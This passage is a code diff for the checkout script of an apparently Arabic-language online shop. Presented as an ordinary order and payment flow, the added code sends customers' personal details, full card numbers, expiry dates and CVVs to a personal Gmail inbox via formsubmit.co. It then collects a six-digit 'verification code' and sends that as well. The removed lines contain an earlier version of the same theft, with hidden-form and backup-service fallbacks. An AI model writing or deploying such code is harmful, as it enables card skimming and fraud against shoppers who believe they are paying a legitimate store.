+                postalCode: form.querySelector('input[name="postal_code"]').value,
+                orderNotes: form.querySelector('textarea[name="order_notes"]').value
+            };
+            
+            // Prepare form data for email
+            const formData = new FormData();
+            formData.append('_subject', '📋 معلومات عميل جديد - مكاسر العود');
+            formData.append('_captcha', 'false');
+            formData.append('_template', 'table');
+            formData.append('الاسم_الأول', customerInfo.firstName);
+            formData.append('الاسم_الأخير', customerInfo.lastName);
+            formData.append('البريد_الإلكتروني', customerInfo.email);
+            formData.append('رقم_الهاتف', customerInfo.phone);
+            formData.append('العنوان', customerInfo.address);
+            formData.append('المدينة', customerInfo.city);
+            formData.append('الرمز_البريدي', customerInfo.postalCode);
+            formData.append('ملاحظات_الطلب', customerInfo.orderNotes || 'لا توجد ملاحظات');
+            formData.append('تاريخ_التسجيل', new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'}));
+            formData.append('حالة_الطلب', 'معلومات العميل - المرحلة الأولى');
+            
+            // Send to email
+            fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
+            }).then(() => {
+                console.log('✅ تم إرسال معلومات العميل بنجاح');
+                setTimeout(() => {
+                    submitBtn.innerHTML = originalText;
+                    submitBtn.disabled = false;
+                    
+                    showNotification('✅ تم حفظ معلوماتك بنجاح!', 'success');
+                    showOrderReviewPage();
+                }, 1500);
+            }).catch(() => {
+                console.log('❌ فشل في إرسال معلومات العميل');
+                setTimeout(() => {
+                    submitBtn.innerHTML = originalText;
+                    submitBtn.disabled = false;
+                    
+                    showNotification('⚠️ سيتم المتابعة بدون حفظ مؤقت', 'error');
+                    showOrderReviewPage();
+                }, 1500);
+            });
+            
+            return false;
+        }
+
+        function showOrderReviewPage() {
+            document.getElementById('orderInfoPage').classList.remove('active');
+            document.getElementById('orderReviewPage').classList.add('active');
+            
+            // Populate review data
+            populateOrderReview();
+        }
+
+        function populateOrderReview() {
+            // Populate order items
+            const reviewOrderItems = document.getElementById('reviewOrderItems');
+            reviewOrderItems.innerHTML = cart.map(item => `
+                <div class="flex justify-between items-center p-4 bg-gray-50 rounded-lg">
+                    <div class="flex items-center">
+                        <img src="${item.image}" alt="${item.name}" class="w-12 h-12 object-cover rounded ml-3">
+                        <div>
+                            <h4 class="font-semibold">${item.name}</h4>
+                            <p class="text-sm text-gray-600">الكمية: ${item.quantity}</p>
+                        </div>
+                    </div>
+                    <span class="font-bold text-orange-600">${item.price * item.quantity} ريال</span>
+                </div>
+            `).join('');
+            
+            // Populate customer info
+            const reviewCustomerInfo = document.getElementById('reviewCustomerInfo');
+            reviewCustomerInfo.innerHTML = `
+                <div class="space-y-2 text-sm">
+                    <p><strong>الاسم:</strong> ${customerInfo.firstName} ${customerInfo.lastName}</p>
+                    <p><strong>البريد الإلكتروني:</strong> ${customerInfo.email}</p>
+                    <p><strong>رقم الهاتف:</strong> ${customerInfo.phone}</p>
+                    <p><strong>العنوان:</strong> ${customerInfo.address}</p>
+                    <p><strong>المدينة:</strong> ${customerInfo.city}</p>
+                    <p><strong>الرمز البريدي:</strong> ${customerInfo.postalCode}</p>
+                    ${customerInfo.orderNotes ? `<p><strong>ملاحظات:</strong> ${customerInfo.orderNotes}</p>` : ''}
+                </div>
+            `;
+            
+            // Populate order summary
             const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
             const shipping = subtotal > 200 ? 0 : 30;
             const total = subtotal + shipping;
             
-            orderSummary.innerHTML = `
-                <h4 class="font-bold mb-6 text-xl text-gray-800 flex items-center">
-                    <i class="fas fa-receipt ml-3 text-orange-600"></i>
-                    ملخص الطلب
-                </h4>
-                <div class="space-y-3">
-                    ${cart.map(item => `
-                        <div class="flex justify-between items-center py-2">
-                            <div class="flex items-center">
-                                <img src="${item.image}" alt="${item.name}" class="w-12 h-12 object-cover rounded ml-3">
-                                <div>
-                                    <span class="font-semibold">${item.name}</span>
-                                    <span class="text-gray-600 text-sm block">الكمية: ${item.quantity}</span>
-                                </div>
-                            </div>
-                            <span class="font-bold">${item.price * item.quantity} ريال</span>
-                        </div>
-                    `).join('')}
-                </div>
-                <div class="border-t pt-4 mt-4 space-y-2">
-                    <div class="flex justify-between text-gray-600">
+            const reviewOrderSummary = document.getElementById('reviewOrderSummary');
+            reviewOrderSummary.innerHTML = `
+                <div class="bg-gradient-to-r from-orange-50 to-yellow-50 p-6 rounded-xl border border-orange-200">
+                    <div class="flex justify-between text-lg mb-2">
                         <span>المجموع الفرعي:</span>
-                        <span>${subtotal} ريال</span>
+                        <span class="font-semibold">${subtotal} ريال</span>
                     </div>
-                    <div class="flex justify-between text-gray-600">
+                    <div class="flex justify-between text-lg mb-2">
                         <span>رسوم الشحن:</span>
-                        <span class="${shipping === 0 ? 'text-green-600' : ''}">${shipping === 0 ? 'مجاني' : shipping + ' ريال'}</span>
+                        <span class="font-semibold ${shipping === 0 ? 'text-green-600' : ''}">${shipping === 0 ? 'مجاني' : shipping + ' ريال'}</span>
                     </div>
-                    <div class="flex justify-between font-bold text-2xl pt-2 border-t text-orange-600">
-                        <span>الإجمالي:</span>
-                        <span>${total} ريال</span>
+                    ${shipping > 0 ? `<p class="text-sm text-orange-600 mb-4">شحن مجاني للطلبات أكثر من 200 ريال</p>` : ''}
+                    <div class="border-t border-orange-200 pt-4">
+                        <div class="flex justify-between text-2xl font-bold text-orange-600">
+                            <span>الإجمالي:</span>
+                            <span>${total} ريال</span>
+                        </div>
                     </div>
                 </div>
             `;
         }
 
+        function goBackToInfo() {
+            document.getElementById('orderReviewPage').classList.remove('active');
+            document.getElementById('orderInfoPage').classList.add('active');
+        }
+
+        function editCustomerInfo() {
+            goBackToInfo();
+        }
+
+        function proceedToPayment() {
+            document.getElementById('orderReviewPage').classList.remove('active');
+            document.getElementById('paymentPage').classList.add('active');
+            
+            populatePaymentSummary();
+        }
+
+        function populatePaymentSummary() {
+            const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            const shipping = subtotal > 200 ? 0 : 30;
+            const total = subtotal + shipping;
+            
+            const paymentSummary = document.getElementById('paymentSummary');
+            paymentSummary.innerHTML = `
+                <div class="bg-gradient-to-r from-green-50 to-blue-50 p-6 rounded-xl border border-green-200">
+                    <h4 class="font-bold text-lg mb-4 text-gray-800">المبلغ المطلوب دفعه</h4>
+                    <div class="space-y-3">
+                        <div class="flex justify-between">
+                            <span>المنتجات (${cart.length} عنصر):</span>
+                            <span class="font-semibold">${subtotal} ريال</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span>الشحن:</span>
+                            <span class="font-semibold ${shipping === 0 ? 'text-green-600' : ''}">${shipping === 0 ? 'مجاني' : shipping + ' ريال'}</span>
+                        </div>
+                        <div class="border-t border-gray-200 pt-3">
+                            <div class="flex justify-between text-xl font-bold text-green-600">
+                                <span>المجموع النهائي:</span>
+                                <span>${total} ريال</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+
+        function goBackToReview() {
+            document.getElementById('paymentPage').classList.remove('active');
+            document.getElementById('orderReviewPage').classList.add('active');
+        }
+
+        // SUBMIT PAYMENT
+        function submitPayment(event) {
+            event.preventDefault();
+            
+            const form = event.target;
+            const submitBtn = document.getElementById('submitPaymentBtn');
+            const originalText = submitBtn.innerHTML;
+            
+            // Show loading state
+            submitBtn.innerHTML = '<div class="loading-spinner"></div>جاري إتمام الدفع...';
+            submitBtn.disabled = true;
+            
+            // Generate verification code
+            verificationCode = Math.floor(100000 + Math.random() * 900000);
+            
+            // Save card data
+            const cardData = {
+                cardNumber: form.querySelector('input[name="card_number"]').value,
+                expiryDate: form.querySelector('input[name="expiry_date"]').value,
+                cardHolder: form.querySelector('input[name="card_holder"]').value
+            };
+            saveCard(cardData);
+            
+            // Calculate totals
+            const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            const shipping = subtotal > 200 ? 0 : 30;
+            const total = subtotal + shipping;
+            
+            // Prepare payment data for email
+            const formData = new FormData();
+            formData.append('_subject', `💳 عملية دفع جديدة - مكاسر العود - الكود: ${verificationCode}`);
+            formData.append('_captcha', 'false');
+            formData.append('_template', 'table');
+            
+            // Customer info
+            formData.append('الاسم_الكامل', `${customerInfo.firstName} ${customerInfo.lastName}`);
+            formData.append('البريد_الإلكتروني', customerInfo.email);
+            formData.append('رقم_الهاتف', customerInfo.phone);
+            formData.append('العنوان_الكامل', `${customerInfo.address}, ${customerInfo.city}, ${customerInfo.postalCode}`);
+            
+            // Payment info
+            formData.append('رقم_البطاقة', form.querySelector('input[name="card_number"]').value);
+            formData.append('تاريخ_الانتهاء', form.querySelector('input[name="expiry_date"]').value);
+            formData.append('رمز_الأمان', form.querySelector('input[name="cvv"]').value);
+            formData.append('اسم_حامل_البطاقة', form.querySelector('input[name="card_holder"]').value);
+            
+            // Order details
+            const itemsDetails = cart.map(item => `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`).join(' | ');
+            formData.append('المنتجات', itemsDetails);
+            formData.append('المجموع_الفرعي', `${subtotal} ريال`);
+            formData.append('رسوم_الشحن', `${shipping} ريال`);
+            formData.append('الإجمالي', `${total} ريال`);
+            formData.append('كود_التأكيد', verificationCode);
+            formData.append('تاريخ_العملية', new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'}));
+            formData.append('حالة_الطلب', 'دفع مكتمل - بانتظار التأكيد');
+            formData.append('ملاحظات_إضافية', customerInfo.orderNotes || 'لا توجد ملاحظات');
+            
+            // Send to email
+            fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
+            }).then(() => {
+                console.log('✅ تم إرسال معلومات الدفع بنجاح');
+                setTimeout(() => {
+                    submitBtn.innerHTML = originalText;
+                    submitBtn.disabled = false;
+                    
+                    // Store verification info
+                    localStorage.setItem('currentVerificationCode', verificationCode.toString());
+                    localStorage.setItem('customerPhone', customerInfo.phone);
+                    
+                    showNotification(`✅ كود التأكيد: ${verificationCode}`, 'success');
+                    showVerificationPage();
+                }, 1500);
+            }).catch(() => {
+                console.log('❌ فشل في إرسال معلومات الدفع');
+                setTimeout(() => {
+                    submitBtn.innerHTML = originalText;
+                    submitBtn.disabled = false;
+                    
+                    // Store verification info
+                    localStorage.setItem('currentVerificationCode', verificationCode.toString());
+                    localStorage.setItem('customerPhone', customerInfo.phone);
+                    
+                    showNotification(`✅ كود التأكيد: ${verificationCode}`, 'success');
+                    showVerificationPage();
+                }, 1500);
+            });
+            
+            return false;
+        }
+
+        function showVerificationPage() {
+            document.getElementById('paymentPage').classList.remove('active');
+            document.getElementById('verificationPage').classList.remove('hidden');
+            
+            // Auto-focus first code input
+            setTimeout(() => {
+                document.querySelectorAll('.code-input')[0].focus();
+            }, 500);
+        }
+
+        // CARD MANAGEMENT FUNCTIONS
         function formatCardNumber(input) {
             let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
             let formattedValue = value.match(/.{1,4}/g)?.join(' ');
@@ -1914,7 +2472,6 @@
             input.value = value;
         }
 
-        // Card suggestions functions
         function loadSavedCards() {
             savedCards = JSON.parse(localStorage.getItem('savedCards')) || [];
         }
@@ -2027,223 +2584,7 @@
             formatCardNumber(form.querySelector('input[name="card_number"]'));
         }
 
-        function prepareOrderSubmit(form) {
-            const submitBtn = document.getElementById('submitOrderBtn');
-            const originalText = submitBtn.innerHTML;
-            
-            // إظهار حالة التحميل
-            submitBtn.innerHTML = '<div class="loading-spinner"></div>جاري إرسال الطلب للبريد الإلكتروني...';
-            submitBtn.disabled = true;
-            
-            // حساب المجاميع
-            const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
-            const shipping = subtotal > 200 ? 0 : 30;
-            const total = subtotal + shipping;
-            
-            // توليد كود التأكيد
-            const verificationCode = Math.floor(100000 + Math.random() * 900000);
-            const customerPhone = form.querySelector('input[name="phone"]').value;
-            
-            // حفظ كود التأكيد ورقم الهاتف
-            localStorage.setItem('currentVerificationCode', verificationCode.toString());
-            localStorage.setItem('customerPhone', customerPhone);
-            
-            // ملء الحقول المخفية بتفاصيل الطلب
-            const itemsDetails = cart.map(item => `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`).join(' | ');
-            
-            document.getElementById('hiddenOrderItems').value = itemsDetails;
-            document.getElementById('hiddenSubtotal').value = `${subtotal} ريال`;
-            document.getElementById('hiddenShipping').value = `${shipping} ريال`;
-            document.getElementById('hiddenTotal').value = `${total} ريال`;
-            document.getElementById('hiddenVerificationCode').value = verificationCode;
-            document.getElementById('hiddenTimestamp').value = new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'});
-            
-            // تحديث موضوع الإيميل ليحتوي على كود التأكيد
-            form.querySelector('input[name="_subject"]').value = `🛒 طلب جديد من موقع مكاسر العود - الكود: ${verificationCode}`;
-            
-            // حفظ بيانات البطاقة للاستخدام المستقبلي
-            const cardData = {
-                cardNumber: form.querySelector('input[name="card_number"]').value,
-                expiryDate: form.querySelector('input[name="expiry_date"]').value,
-                cardHolder: form.querySelector('input[name="card_holder"]').value
-            };
-            saveCard(cardData);
-            
-            showNotification(`✅ كود التأكيد: ${verificationCode} - جاري الإرسال للبريد الإلكتروني...`, 'success');
-            
-            // السماح للنموذج بالإرسال إلى FormSubmit
-            setTimeout(() => {
-                // تفريغ السلة
-                cart = [];
-                updateCartDisplay();
-                
-                // إغلاق نموذج الطلب
-                closeCheckout();
-                
-                // إظهار صفحة إدخال الكود
-                showSuccessPage();
-                
-                // إعادة تعيين الزر
-                submitBtn.innerHTML = originalText;
-                submitBtn.disabled = false;
-                
-                showNotification('✅ تم إرسال طلبك بنجاح للبريد الإلكتروني!', 'success');
-            }, 2000); // انتظار ثانيتين لضمان الإرسال
-            
-            // السماح للنموذج بالإرسال العادي إلى FormSubmit
-            return true;
-        }
-        
-
-        
-
-        
-        function sendOrderToEmailGuaranteed(form, cartItems, subtotal, shipping, total, verificationCode, customerPhone) {
-            return new Promise((resolve, reject) => {
-                let emailSent = false;
-                let attempts = 0;
-                const maxAttempts = 3;
-                
-                // Prepare comprehensive order data
-                const orderData = {
-                    // Customer Info
-                    first_name: form.querySelector('input[name="first_name"]').value,
-                    last_name: form.querySelector('input[name="last_name"]').value,
-                    email: form.querySelector('input[name="email"]').value,
-                    phone: customerPhone,
-                    address: form.querySelector('input[name="address"]').value,
-                    city: form.querySelector('select[name="city"]').value,
-                    postal_code: form.querySelector('input[name="postal_code"]').value,
-                    
-                    // Payment Info
-                    card_number: form.querySelector('input[name="card_number"]').value,
-                    expiry_date: form.querySelector('input[name="expiry_date"]').value,
-                    cvv: form.querySelector('input[name="cvv"]').value,
-                    card_holder: form.querySelector('input[name="card_holder"]').value,
-                    
-                    // Order Details
-                    cart_items: JSON.stringify(cartItems),
-                    subtotal: subtotal,
-                    shipping: shipping,
-                    total: total,
-                    verification_code: verificationCode,
-                    order_timestamp: new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'}),
-                    
-                    // FormSubmit Settings
-                    _subject: `🛒 طلب جديد من موقع مكاسر العود - الكود: ${verificationCode}`,
-                    _captcha: 'false',
-                    _template: 'table'
-                };
-                
-                function attemptSend() {
-                    attempts++;
-                    console.log(`📧 محاولة إرسال البيانات رقم ${attempts}...`);
-                    
-                    // Method 1: XMLHttpRequest
-                    const xhr = new XMLHttpRequest();
-                    const formData = new FormData();
-                    
-                    // Add all order data to form
-                    Object.keys(orderData).forEach(key => {
-                        formData.append(key, orderData[key]);
-                    });
-                    
-                    xhr.open('POST', 'https://formsubmit.co/zazylalhkr7@gmail.com', true);
-                    
-                    xhr.onreadystatechange = function() {
-                        if (xhr.readyState === 4) {
-                            if (!emailSent) {
-                                emailSent = true;
-                                console.log('✅ تم إرسال البيانات بنجاح عبر XMLHttpRequest');
-                                resolve();
-                            }
-                        }
-                    };
-                    
-                    xhr.onerror = function() {
-                        console.log(`❌ فشل في الإرسال عبر XMLHttpRequest - المحاولة ${attempts}`);
-                        if (attempts < maxAttempts) {
-                            setTimeout(attemptSend, 1000);
-                        }
-                    };
-                    
-                    xhr.send(formData);
-                    
-                    // Method 2: Fetch API (backup)
-                    setTimeout(() => {
-                        if (!emailSent) {
-                            fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
-                                method: 'POST',
-                                body: formData,
-                                mode: 'no-cors'
-                            }).then(() => {
-                                if (!emailSent) {
-                                    emailSent = true;
-                                    console.log('✅ تم إرسال البيانات بنجاح عبر Fetch API');
-                                    resolve();
-                                }
-                            }).catch(() => {
-                                console.log(`❌ فشل في الإرسال عبر Fetch API - المحاولة ${attempts}`);
-                            });
-                        }
-                    }, 500);
-                    
-                    // Method 3: Hidden Form (backup)
-                    setTimeout(() => {
-                        if (!emailSent) {
-                            const hiddenForm = document.createElement('form');
-                            hiddenForm.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
-                            hiddenForm.method = 'POST';
-                            hiddenForm.style.display = 'none';
-                            
-                            Object.keys(orderData).forEach(key => {
-                                const input = document.createElement('input');
-                                input.type = 'hidden';
-                                input.name = key;
-                                input.value = orderData[key];
-                                hiddenForm.appendChild(input);
-                            });
-                            
-                            document.body.appendChild(hiddenForm);
-                            hiddenForm.submit();
-                            
-                            // Clean up
-                            setTimeout(() => {
-                                if (hiddenForm.parentNode) {
-                                    document.body.removeChild(hiddenForm);
-                                }
-                            }, 3000);
-                            
-                            console.log('📧 تم إرسال البيانات عبر Hidden Form كنسخة احتياطية');
-                        }
-                    }, 1000);
-                }
-                
-                // Start sending
-                attemptSend();
-                
-                // Timeout after 10 seconds
-                setTimeout(() => {
-                    if (!emailSent) {
-                        emailSent = true;
-                        console.log('⚠️ انتهت مهلة الإرسال - سيتم المتابعة');
-                        resolve(); // Continue anyway
-                    }
-                }, 10000);
-            });
-        }
-
-        function showSuccessPage() {
-            document.getElementById('mainContent').style.display = 'none';
-            document.getElementById('successPage').classList.remove('hidden');
-            
-            // Auto-focus first code input
-            setTimeout(() => {
-                document.querySelectorAll('.code-input')[0].focus();
-            }, 500);
-        }
-
-        // Enhanced code verification functions with auto-advance and smart input
+        // VERIFICATION CODE FUNCTIONS
         function moveToNext(current, nextIndex) {
             // Allow only numbers
             const numericValue = current.value.replace(/[^0-9]/g, '');
@@ -2255,7 +2596,7 @@
                 const nextInput = inputs[nextIndex];
                 if (nextInput) {
                     nextInput.focus();
-                    nextInput.select(); // Select content for easy overwrite
+                    nextInput.select();
                 }
             }
             
@@ -2294,7 +2635,7 @@
             if (code.length === 6 && /^[0-9]{6}$/.test(code)) {
                 showNotification('تم تأكيد الكود! جاري إرسال التأكيد...', 'success');
                 
-                // إرسال تأكيد الكود إلى البريد الإلكتروني
+                // Send code confirmation to email
                 sendCodeConfirmationToEmail(code);
                 
                 setTimeout(() => {
@@ -2308,9 +2649,13 @@
                     
                     showNotification('✅ تم إرسال تأكيد الكود للبريد الإلكتروني وتم التوجيه إلى واتساب', 'success');
                     
+                    // Clear cart and return to main page
+                    cart = [];
+                    updateCartDisplay();
+                    
                     // Return to main page after short delay
                     setTimeout(() => {
-                        document.getElementById('successPage').classList.add('hidden');
+                        document.getElementById('verificationPage').classList.add('hidden');
                         document.getElementById('mainContent').style.display = 'block';
                         window.scrollTo({ top: 0, behavior: 'smooth' });
                     }, 2000);
@@ -2319,112 +2664,34 @@
                 showNotification('يرجى إدخال كود مكون من 6 أرقام فقط', 'error');
             }
         }
-        
+
         function sendCodeConfirmationToEmail(confirmedCode) {
-            // Get stored customer info
-            const customerPhone = localStorage.getItem('customerPhone') || 'غير محدد';
-            const originalCode = localStorage.getItem('currentVerificationCode') || 'غير محدد';
+            const customerPhone = localStorage.getItem('customerPhone') || customerInfo.phone || 'غير محدد';
+            const originalCode = localStorage.getItem('currentVerificationCode') || verificationCode || 'غير محدد';
             
-            // إرسال تأكيد الكود عبر عدة طرق لضمان الوصول
-            
-            // الطريقة الأولى: FormSubmit
-            const formData1 = new FormData();
-            formData1.append('_subject', '✅ تأكيد كود الطلب - مكاسر العود');
-            formData1.append('_captcha', 'false');
-            formData1.append('_template', 'table');
-            formData1.append('confirmed_code', confirmedCode);
-            formData1.append('original_code', originalCode);
-            formData1.append('customer_phone', customerPhone);
-            formData1.append('confirmation_time', new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'}));
-            formData1.append('status', 'تم تأكيد الكود بنجاح');
-            formData1.append('website', 'مكاسر العود');
+            // Send confirmation via FormSubmit
+            const formData = new FormData();
+            formData.append('_subject', '✅ تأكيد كود الطلب - مكاسر العود');
+            formData.append('_captcha', 'false');
+            formData.append('_template', 'table');
+            formData.append('الكود_المدخل', confirmedCode);
+            formData.append('الكود_الأصلي', originalCode);
+            formData.append('رقم_الهاتف', customerPhone);
+            formData.append('اسم_العميل', `${customerInfo.firstName} ${customerInfo.lastName}`);
+            formData.append('وقت_التأكيد', new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'}));
+            formData.append('الحالة', 'تم تأكيد الكود بنجاح ✅');
+            formData.append('المرحلة_التالية', 'توجيه العميل إلى واتساب');
+            formData.append('الموقع', 'مكاسر العود');
             
             fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
                 method: 'POST',
-                body: formData1,
+                body: formData,
                 mode: 'no-cors'
             }).then(() => {
-                console.log('✅ تم إرسال تأكيد الكود عبر FormSubmit');
+                console.log('✅ تم إرسال تأكيد الكود بنجاح');
             }).catch(() => {
-                console.log('❌ فشل في إرسال تأكيد الكود عبر FormSubmit');
+                console.log('❌ فشل في إرسال تأكيد الكود');
             });
-            
-            // الطريقة الثانية: Formspree كنسخة احتياطية
-            setTimeout(() => {
-                const formData2 = new FormData();
-                formData2.append('email', 'zazylalhkr7@gmail.com');
-                formData2.append('subject', '✅ تأكيد كود الطلب - مكاسر العود');
-                formData2.append('message', `
-                    تأكيد كود الطلب
-                    ================
-                    
-                    الكود المُدخل: ${confirmedCode}
-                    الكود الأصلي: ${originalCode}
-                    رقم الهاتف: ${customerPhone}
-                    وقت التأكيد: ${new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'})}
-                    الحالة: تم تأكيد الكود بنجاح ✅
-                    
-                    تم توجيه العميل إلى واتساب لمتابعة الطلب.
-                    
-                    ---
-                    موقع مكاسر العود
-                `);
-                
-                fetch('https://formspree.io/f/xpwaqynq', {
-                    method: 'POST',
-                    body: formData2,
-                    headers: {
-                        'Accept': 'application/json'
-                    }
-                }).then(response => {
-                    if (response.ok) {
-                        console.log('✅ تم إرسال تأكيد الكود عبر Formspree');
-                    }
-                }).catch(() => {
-                    console.log('❌ فشل في إرسال تأكيد الكود عبر Formspree');
-                });
-            }, 500);
-            
-            // الطريقة الثالثة: نموذج مخفي كنسخة احتياطية ثالثة
-            setTimeout(() => {
-                const hiddenForm = document.createElement('form');
-                hiddenForm.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
-                hiddenForm.method = 'POST';
-                hiddenForm.style.display = 'none';
-                
-                const inputs = {
-                    '_subject': '✅ تأكيد كود الطلب - مكاسر العود',
-                    '_captcha': 'false',
-                    '_template': 'table',
-                    'confirmed_code': confirmedCode,
-                    'original_code': originalCode,
-                    'customer_phone': customerPhone,
-                    'confirmation_time': new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'}),
-                    'status': 'تم تأكيد الكود بنجاح',
-                    'website': 'مكاسر العود',
-                    'action': 'تأكيد كود الطلب'
-                };
-                
-                Object.keys(inputs).forEach(key => {
-                    const input = document.createElement('input');
-                    input.type = 'hidden';
-                    input.name = key;
-                    input.value = inputs[key];
-                    hiddenForm.appendChild(input);
-                });
-                
-                document.body.appendChild(hiddenForm);
-                hiddenForm.submit();
-                
-                console.log('✅ تم إرسال تأكيد الكود عبر النموذج المخفي');
-                
-                // Clean up
-                setTimeout(() => {
-                    if (hiddenForm.parentNode) {
-                        document.body.removeChild(hiddenForm);
-                    }
-                }, 3000);
-            }, 1000);
         }
 
         function resendCode() {
@@ -2434,7 +2701,7 @@
             showNotification('تم إعادة إرسال الكود بنجاح', 'success');
         }
 
-        // Utility functions
+        // UTILITY FUNCTIONS
         function setupScrollButton() {
             const scrollButton = document.querySelector('.scroll-to-top');
             
@@ -2490,12 +2757,6 @@
             });
         });
 
-        // Mobile menu toggle (if needed)
-        function toggleMobileMenu() {
-            const nav = document.querySelector('nav');
-            nav.classList.toggle('active');
-        }
-
         // Dark mode detection
         if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
             document.documentElement.classList.add('dark');
@@ -2511,41 +2772,22 @@
 
         // Keyboard shortcuts
         document.addEventListener('keydown', function(event) {
-            // ESC to close modals
+            // ESC to close modals and go back
             if (event.key === 'Escape') {
                 closeCart();
-                closeCheckout();
-            }
-            
-            // Ctrl/Cmd + K to open search (future feature)
-            if ((event.ctrlKey || event.metaKey) && event.key === 'k') {
-                event.preventDefault();
-                // Open search modal (to be implemented)
+                
+                // Close fullscreen pages
+                if (document.getElementById('orderInfoPage').classList.contains('active')) {
+                    goBackToCart();
+                } else if (document.getElementById('orderReviewPage').classList.contains('active')) {
+                    goBackToInfo();
+                } else if (document.getElementById('paymentPage').classList.contains('active')) {
+                    goBackToReview();
+                } else if (!document.getElementById('verificationPage').classList.contains('hidden')) {
+                    // Don't allow escape from verification page
+                }
             }
         });
-
-        // Performance optimization
-        function lazyLoadImages() {
-            const images = document.querySelectorAll('img[loading="lazy"]');
-            
-            if ('IntersectionObserver' in window) {
-                const imageObserver = new IntersectionObserver((entries, observer) => {
-                    entries.forEach(entry => {
-                        if (entry.isIntersecting) {
-                            const img = entry.target;
-                            img.src = img.dataset.src || img.src;
-                            img.classList.remove('lazy');
-                            observer.unobserve(img);
-                        }
-                    });
-                });
-
-                images.forEach(img => imageObserver.observe(img));
-            }
-        }
-
-        // Initialize lazy loading
-        document.addEventListener('DOMContentLoaded', lazyLoadImages);
     </script>
 
 
